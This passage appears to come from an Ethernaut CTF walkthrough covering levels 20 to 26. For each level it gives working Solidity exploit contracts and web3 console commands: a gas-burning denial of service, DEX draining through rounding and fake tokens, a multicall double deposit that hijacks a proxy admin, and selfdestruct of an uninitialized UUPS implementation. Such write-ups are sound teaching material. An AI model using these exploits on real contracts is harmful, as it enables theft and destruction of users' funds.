Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of 2<sup>256</sup>. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by [2017's Underhanded coding contest](https://weka.medium.com/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)

### Level 20. Denial

**Goal**: `player` has to plant a denial of service attack such that `owner` is unable to withdraw funds through `withdraw` method.

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

This contract's vulnerability comes from the `withdraw` method which does not mitigate against possible attack through execution of some unknown external contract code through `call` method. `call` did not set a gas limit that external call can use.

The `call` method here can invoke the `receive` method of a malicious contract at `partner` address. And this is where we're going to eat up all gas so that `withdraw` function `revert`s with out of gas exception.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

Solution:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract HackDenial {
    // gas burner
    uint256 n;
    function burn() internal {
        while (gasleft() > 0) {
            n += 1;
        }
    }

    receive() external payable {
        burn();
    }
}
```

This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.

Typically one should follow the [checks-effects-interactions](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

_Note_: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.

### Level 21. Shop

**Goal**: `player` has to set price to less than it's current value.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

Solution:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IShop {
    function buy() external;
    function price() external view returns (uint);
    function isSold() external view returns (bool);
}

contract Buyer {

    function price() external view returns (uint) {
        bool isSold = IShop(msg.sender).isSold();
        uint askedPrice = IShop(msg.sender).price();
        if (!isSold) return askedPrice;
        return 0;
    }

    function callBuy(address _shopAddr) public {
        IShop(_shopAddr).buy();
    }
}
```

The new value of `price` is fetched by calling `price()` method of a `Buyer` contract. Note that there are two distinct `price()` calls - in the `if` statement check and while setting new value of `price`. A `Buyer` can cheat by returning a legit value in `price()` method of `Buyer` during the first invocation (during `if` check) and returning any less value, say 0, during second invocation (while setting `price`).

But, we can't track the number of `price()` invocation in `Buyer` contract because `price()` must be a view function (as per the interface) - can't write to storage! However, look closely new `price` in `buy()` is set after isSold is set to `true`. We can read the public `isSold` variable and return from `price()` of `Buyer` contract accordingly.

**_Key Security Takeaways_**

- Understanding restrictions of [view functions](https://docs.soliditylang.org/en/develop/contracts.html#view-functions)
- Contracts can manipulate data seen by other contracts in any way they want.
- It's unsafe to change the state based on external and untrusted contracts logic.

### Level 22. Dex

Useful links:

- [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)
- Solidity [division operation](https://docs.soliditylang.org/en/v0.8.11/types.html#division)

**Goal**: `player` has to drain all of at least one of the two tokens - `token1` and `token2` from the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_finance#Decentralized_exchanges) contract.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

The vulnerability originates from `get_swap_price` method which determines the exchange rate between tokens in the Dex. The division in it won't always calculate to a perfect integer, but a fraction. And there is **_NO_** fraction types in Solidity. Instead, _division rounds towards zero_. according to docs. For example, `3 / 2 = 1` in solidity.

We're going to swap all of our `token1` for `token2`. Then swap all our `token2` to obtain `token1`, then swap all our `token1` for `token2` and so on.

Here's how the price history & balances would go. Initially,

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |

After swapping all of `token1`:

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |
|  110   |   90   |   0    |   20   |

Note that at this point exchange rate is adjusted. Now, exchanging 20 `token2` should give 20 \* 110 / 90 = 24.44... But since division results in integer we get 24 `token2`. Price adjusts again. Swap again.

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |
|  110   |   90   |   0    |   20   |
|   86   |  110   |   24   |   0    |

Notice that on each swap we get more of `token1` or `token2` than held before previous swap. This is due to the inaccuracy of price calculation in `get_swap_price` method.

Keep swapping and we'll get:

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |
|  110   |   90   |   0    |   20   |
|   86   |  110   |   24   |   0    |
|  110   |   80   |   0    |   30   |
|   69   |  110   |   41   |   0    |
|  110   |   45   |   0    |   65   |

Now, at the last swap above we've gotten hold of 65 `token2`, which is more than enough to drain all of 110 token1! By simple calculation, only 45 of token2 is required to get all 110 of `token1`.

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |
|  110   |   90   |   0    |   20   |
|   86   |  110   |   24   |   0    |
|  110   |   80   |   0    |   30   |
|   69   |  110   |   41   |   0    |
|  110   |   45   |   0    |   65   |
|   0    |   90   |  110   |   20   |

Jump into console. First approve the contract to transfer your tokens with a big enough allowance so that we don't have to approve again & again. Allowance of 500 should be more than enough:

```js
await contract.approve(contract.address, 500);
```

Get token addresses:

```js
t1 = await contract.token1();
t2 = await contract.token2();
```

```js
await contract.swap(t1, t2, 10);
await contract.swap(t2, t1, 20);
await contract.swap(t1, t2, 24);
await contract.swap(t2, t1, 30);
await contract.swap(t1, t2, 41);
await contract.swap(t2, t1, 45);
```

The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. This is why we need [oracles](https://betterprogramming.pub/what-is-a-blockchain-oracle-f5ccab8dbd72). Oracles are ways to get data into and out of smart contracts. We should be getting our data from multiple independent decentralized sources, otherwise we can run this risk.

[Chainlink Data Feeds](https://docs.chain.link/docs/get-the-latest-price/) are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer [secure randomness](https://docs.chain.link/docs/chainlink-vrf/), ability to make [any API call](https://docs.chain.link/docs/make-a-http-get-request/), [modular oracle network creation](https://docs.chain.link/docs/architecture-decentralized-model/), [upkeep, actions, and maintenance](https://docs.chain.link/docs/chainlink-keepers/introduction/), and unlimited customization.

[Uniswap TWAP Oracles](https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles) relies on a time weighted price model called [TWAP](https://en.wikipedia.org/wiki/Time-weighted_average_price#). While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.

### Level 23. Dex Two

**Goal**: `player` has to drain all of `token1` and `token2`.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

The vulnerability here arises from `swap` method which does not check that the swap is necessarily between `token1` and `token2`. We'll exploit this.

Let's deploy a token - `EvilToken` in Remix, with initial supply of 400, all given to `msg.sender` which would be the `player`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract EvilToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
        _mint(msg.sender, initialSupply);
    }
}
```

We're going to exchange `EVL` token for `token1` and `token2` in such a way to drain both from `DexTwo`. Initially both `token1` and `token2` is 100. **Let's send 100 of `EVL` to `DexTwo` using `EvilToken`'s `transfer`.** So, that price ratio in `DexTwo` between `EVL` and `token1` is 1:1. Same ratio goes for `token2`.

Also, allow `DexTwo` to transact 300 (100 for `token1` and 200 for `token2` exchange) of our `EVL` tokens so that it can swap `EVL` tokens. This can be done by `approve` method of `EvilToken`, passing `contract.address` and `200` as params.

Alright at this point `DexTwo` has 100 of each - `token1`, `token2` and `EVL`. And `player` has 300 of `EVL`.

|  DEX   |        |     | player |        |     |
| :----: | :----: | --- | :----: | :----: | --- |
| token1 | token2 | EVL | token1 | token2 | EVL |
|  100   |  100   | 100 |   10   |   10   | 300 |

Get token addresses:

```js
evlToken = "<EVL-token-address>";
t1 = await contract.token1();
t2 = await contract.token2();
```

Swap 100 of `player`'s `EVL` with `token1`:

```js
await contract.swap(evlToken, t1, 100);
```

Updated balances:

|  DEX   |        |     | player |        |     |
| :----: | :----: | --- | :----: | :----: | --- |
| token1 | token2 | EVL | token1 | token2 | EVL |
|  100   |  100   | 100 |   10   |   10   | 300 |
|   0    |  100   | 200 |  110   |   10   | 200 |

Now, according to `get_swap_amount` method, to get all 100 of `token2` in exchange we need 200 of `EVL`. Swap accordingly:

```js
await contract.swap(evlToken, t2, 200);
```

Finally:

|  DEX   |        |     | player |        |     |
| :----: | :----: | :-: | :----: | :----: | :-: |
| token1 | token2 | EVL | token1 | token2 | EVL |
|  100   |  100   | 100 |   10   |   10   | 300 |
|   0    |  100   | 200 |  110   |   10   | 200 |
|   0    |   0    | 400 |  110   |  110   |  0  |

As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.

Just because a contract claims to implement the [ERC20 spec](https://eips.ethereum.org/EIPS/eip-20) does not mean it's trustworthy.

Some tokens deviate from the ERC20 spec by not returning a boolean value from their `transfer` methods. See [Missing return value bug - At least 130 tokens affected](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca).

Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.

If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.

Useful links:
[Using Remix to Deploy to Moonbeam](https://docs.moonbeam.network/builders/build/eth-api/dev-env/remix/)

### Level 24. Puzzle Wallet

**Goal**: `player` has to hijack the proxy contract, `PuzzleProxy` by becoming `admin`.

The vulnerability here arises due to **storage collision** between the proxy contract (`PuzzleProxy`) and logic contract (`PuzzleWallet`). And storage collision is a nightmare when using `delegatecall`.

Note that in proxy pattern any call/transaction sent does not directly go to the logic contract (`PuzzleWallet` here), but it is actually **delegated** to logic contract inside proxy contract (`PuzzleProxy` here) through `delegatecall` method.

Since, `delegatecall` is _context preserving_, the context is taken from `PuzzleProxy`. Meaning, any state read or write in storage would happen in `PuzzleProxy` at a corresponding slot, instead of `PuzzleWallet`.

Compare the storage variables at slots:

```
slot | PuzzleWallet  -  PuzzleProxy
----------------------------------
  0  |   owner      <-  pendingAdmin
  1  |   maxBalance <-  admin
  2  |              ...
  3  |              ...
```

Accordingly, any write to `pendingAdmin` in `PuzzleProxy` would be reflected by `owner` in `PuzzleWallet` because they are at same storage slot, 0.

And that means if we set `pendingAdmin` to `player` in `PuzzleProxy` (through `proposeNewAdmin` method), `player` is automatically `owner` in `PuzzleWallet`. Although contract instance provided `web3js` API, it doesn't expose the `proposeNewAdmin` method, **_we can alway encode signature of function call and send transaction to the contract_**:

```js
functionSignature = {
  name: "proposeNewAdmin",
  type: "function",
  inputs: [
    {
      type: "address",
      name: "_newAdmin",
    },
  ],
};

params = [player];

data = web3.eth.abi.encodeFunctionCall(functionSignature, params);

await web3.eth.sendTransaction({ from: player, to: instance, data });
```

`player` is now `owner`. Verify by:

```js
(await contract.owner()) === player;
```

Now, since we're `owner` let's whitelist us, `player`:

```js
await contract.addToWhitelist(player);
```

Okay, so now `player` can call `onlyWhitelisted` guarded methods.

Also, note from the storage slot table above that `admin` and `maxBalance` also correspond to same slot (slot 1). We can write to `admin` if in some way we can write to `maxBalance` the address of `player`.

Two methods alter `maxBalance` - `init` and `setMaxBalance`. `init` shows no hope as it `require`s current `maxBalance` value to be zero. So, let's focus on `setMaxBalance`.

`setMaxBalance` can only set new `maxBalance` only if the contract's balance is 0. Check balance:

```js
await getBalance(contract.address);
```

It's non-zero. Can we somehow take out the contract's balance? Only method that does so, is `execute`, but contract tracks each user's balance through `balances` such that you can only withdraw what you deposited. We need some way to crack the contract's accounting mechanism so that we can withdraw more than deposited and hence drain contract's balance.

A possible way is to somehow call `deposit` with same `msg.value` _multiple_ times within the same transaction. The developers of this contract did write logic to batch multiple transactions into one transaction to save gas costs. And this is what `multicall` method is for.

`multicall` actually extracts function selector (which is first 4 bytes from signature) from the data and makes sure that `deposit` is called only once per transaction...

```solidity
assembly {
    selector := mload(add(_data, 32))
}
if (selector == this.deposit.selector) {
    require(!depositCalled, "Deposit can only be called once");
    // Protect against reusing msg.value
    depositCalled = true;
}
```

We need another way. We can only call `deposit` only once in a `multicall` but what if call a `multicall` that calls multiple `multicall`s and each of these `multicall`s call deposit once. That'd be totally valid since each of these multiple `multicall`s will check their own separate `depositCalled` bools.

The contract balance currently is `0.001 eth`. If we're able to call `deposit` two times through two `multicall`s in same transaction. The `balances[player]` would be registered from `0 eth` to `0.002 eth`, but in reality only `0.001 eth` will be actually sent. Hence total balance of contract is in reality `0.002 eth` but accounting in `balances` would think it's `0.003 eth`. Anyway, `player` is now eligible to take out `0.002 eth` from contract and drain it as a result.

Here's our call _inception_

```
            multicall
                |
        ------------------
        |                |
    multicall        multicall
        |                |
     deposit          deposit
```

Get function call encodings:

```js
// deposit() method
depositData = await contract.methods["deposit()"].request().then((v) => v.data);

// multicall() method with param of deposit function call signature
multicallData = await contract.methods["multicall(bytes[])"]
  .request([depositData])
  .then((v) => v.data);
```

Now we call `multicall` which will call two `multicall`s and each of these two will call `deposit` once each. Send value of `0.001 eth` with transaction:

```js
await contract.multicall([multicallData, multicallData], {
  value: toWei("0.001"),
});
```

`player` balance now must be `0.001 eth * 2` i.e. `0.002 eth`. Which is equal to contract's total balance at this time.

Withdraw same amount by execute:

```js
await contract.execute(player, toWei("0.002"), 0x0);
```

By now, contract's balance must be zero. Verify:

```js
await getBalance(contract.address);
```

Finally we can call `setMaxBalance` to set `maxBalance` and as a consequence of storage collision, set admin to `player`:

```js
await contract.setMaxBalance(player);
```

### Level 25. Motorbike

**Goal**: `player` has to make the proxy (`Motorbike`) unusable by destroying the implementation/logic contract (`Engine`) through `selfdestruct`.

Useful links:

- [Proxy Patterns](https://blog.openzeppelin.com/proxy-patterns/)
- [UUPS Proxies](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)
- [OpenZeppelin Proxies](https://docs.openzeppelin.com/contracts/4.x/api/proxy)
- [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract

Given Contract:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

As you can see current `Engine` implementation has no `selfdestruct` logic anywhere. So, we can't call `selfdestruct` with current implementation anyway. But, since it is a logic/implementation contract of proxy pattern, it can be upgraded to a new contract that has the `selfdestruct` in it.

`upgradeToAndCall` method is at our disposal for upgrading to a new contract address, but it has an authorization check such that only the `upgrader` address can call it. So, `player` has to somehow take over as `upgrader`.

The key thing to keep in mind here is that any storage variables defined in the logic contract i.e. `Engine` is **_actually_** stored in the proxy's (`Motorbike`'s) storage and not actually `Engine`. Proxy is the storage layer here which delegates _only_ the logic to logic/implementation contract (logic layer).

The UUPS standardizes the location of the Logic Contract. Per the `EIP-1967` whitepaper:

> _Logic contract address [is located in slot]_
>
> 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
> (obtained as `bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1))`.

What if we did try to write and read in the context of `Engine` directly, instead of going through proxy? We'll need address of `Engine` first. This address is at storage slot `\_IMPLEMENTATION_SLOT` of `Motorbike`. Let's read it:

```js
implAddr = await web3.eth.getStorageAt(
  contract.address,
  "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
);
```

This yields a 32 byte value (each slot is 32 byte). Remove padding of `0`s to get 20 byte `address`:

```js
implAddr = "0x" + implAddr.slice(-40);
```

Now, if we sent a transaction directly to `initialize` of `Engine` rather than going through proxy, the code will run in `Engine`'s context rather than proxy's. That means the storage variables - `initialized`, `initializing` (inherited from `Initializable`), `upgrader` etc. will be read from `Engine`'s storage slots. And these variables will most likely will contain their default values - `false`, `false`, `0x0` respectively because `Engine` was supposed to be only the logic layer, not storage.
And since `initialized` will be equal to `false` (default for `bool`) in context of `Engine` the `initializer` modifier on `initialize` method will pass!

Call the `initialize` at `Engine`'s address i.e. at `implAddr`:

```js
initializeData = web3.eth.abi.encodeFunctionSignature("initialize()");

await web3.eth.sendTransaction({
  from: player,
  to: implAddr,
  data: initializeData,
});
```

Alright, invoking `initialize` method must've now set `player` as `upgrader`. Verify by:

```js
upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()");

(await web3.eth
  .call({ from: player, to: implAddr, data: upgraderData })
  .then((v) => "0x" + v.slice(-40).toLowerCase())) === player.toLowerCase();
```

So, `player` is now eligible to upgrade the implementation contract now through `upgradeToAndCall` method. Let's create the following malicious contract - `HackEngine` in Remix: (read more about [address(0)](https://stackoverflow.com/questions/48219716/what-is-address0-in-solidity))

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract HackEngine {
    function explode() public {
        selfdestruct(payable(address(0)));
    }
}
```

If we set the new implementation through `upgradeToAndCall`, passing `HackEngine` address and encoding of it's `explode` method as params, the existing `Engine` would destroy itself. This is because `_upgradeToAndCall` delegates a call to the given new implementation address with provided `data` param. And since `delegatecall` is context preserving, the `selfdestruct` of `explode` method would run in context of `Engine`. Thus `Engine` is destroyed.

Upgrade `Engine` to `HackEngine`. First set up function data of `upgradeToAndCall` to call at `implAddress`:

```js
bombAddr = "<BombEngine-instance-address>";
explodeData = web3.eth.abi.encodeFunctionSignature("explode()");

upgradeSignature = {
  name: "upgradeToAndCall",
  type: "function",
  inputs: [
    {
      type: "address",
      name: "newImplementation",
    },
    {
      type: "bytes",
      name: "data",
    },
  ],
};

upgradeParams = [bombAddr, explodeData];

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams);
```

Now call `upgradeToAndCall` at `implAddr`:

```js
await web3.eth.sendTransaction({
  from: player,
  to: implAddr,
  data: upgradeData,
});
```

The `Engine` is destroyed. The `Motorbike` is now useless. `Motorbike` cannot even be repaired now because all the upgrade logic was in the logic contract which is now destroyed.

The advantage of following an UUPS pattern is to have very minimal proxy to be deployed. The proxy acts as storage layer so any state modification in the implementation contract normally doesn't produce side effects to systems using it, since only the logic is used through delegatecalls.

![](https://i0.wp.com/blog.openzeppelin.com/wp-content/uploads/2018/04/1Proxy0-1.png?resize=840%2C93&ssl=1)

- To implement an upgradeable smart contract, the **logic layer** (i.e., the **implementation contract**) is separated from the **storage layer** (i.e., the **proxy contract**) and all calls to the proxy contract are delegated to the logic contract.

This doesn't mean that you shouldn't watch out for vulnerabilities that can be exploited if we leave an implementation contract uninitialized.

This was a slightly simplified version of what has really been discovered after months of the release of UUPS pattern.

Takeways: never leaves implementation contracts uninitialized ;)

If you're interested in what happened, read more [here](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).

### Level 26. Double Entry Point

**Goal**: `player` has to find the bug in the `CryptoVault` and create a Forta bot to protect it from being drained.

This level features a `CryptoVault` with special functionality, the `sweepToken` function. This is a common function to retrieve tokens stuck in a contract. The `CryptoVault` operates with an `underlying` token that can't be swept, being it an important core's logic component of the `CryptoVault`, any other token can be swept.

The underlying token is an instance of the DET (Double EntryPoint Token) token implemented in `DoubleEntryPoint` contract definition and the `CryptoVault` holds 100 units of it. Additionally the `CryptoVault` also holds 100 of `LegacyToken LGT`.

In this level you should figure out where the bug is in `CryptoVault` and protect it from being drained out of tokens.

The contract features a `Forta` contract where any user can register its own `detection bot` contract. Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a `detection bot` and register it in the `Forta` contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.

Things that might help:

- How does a double entry point work for a token contract?

Useful links:

- [Contract ABI Specification](https://docs.soliditylang.org/en/latest/abi-spec.html#contract-abi-specification)

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
      require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }

  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  }
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) public {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

